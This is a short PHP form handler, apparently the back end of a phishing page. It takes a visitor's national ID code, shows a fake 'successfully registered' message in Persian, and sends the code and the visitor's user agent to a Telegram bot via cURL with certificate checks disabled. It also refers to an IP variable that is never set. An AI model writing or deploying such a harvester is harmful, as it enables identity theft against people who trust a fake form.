<?php

require_once 'config.php';

$nationalCode = $_POST['nationalCode'];
   

    if (empty($nationalCode)) {
        $response = array('error' => 'کد ملی را وارد کنید');
    } else {
        // Code for successful validation
        $response = array('success' => 'اطلاعات با موفقیت ثبت شد');
        
        // Send data to Telegram bot
        
        $userAgent = $_SERVER['HTTP_USER_AGENT'];

        $message = "
𝙘𝙤𝙙𝙚: `$nationalCode`
        		
𝙞𝙥: `$ip`
		
`$userAgent`";

        $telegramURL = "https://api.telegram.org/bot$botToken/sendMessage";
        $telegramParameters = array(
            'chat_id' => $chatId,
            'text' => $message,
            'parse_mode' =>'MarkdownV2'
        );

        // Use cURL to send the message to the Telegram bot
        $ch = curl_init($telegramURL);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $telegramParameters);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        $telegramResponse = curl_exec($ch);
        curl_close($ch);
    }

header('Content-Type: text/html; charset=utf-8');

echo json_encode($response);

?>
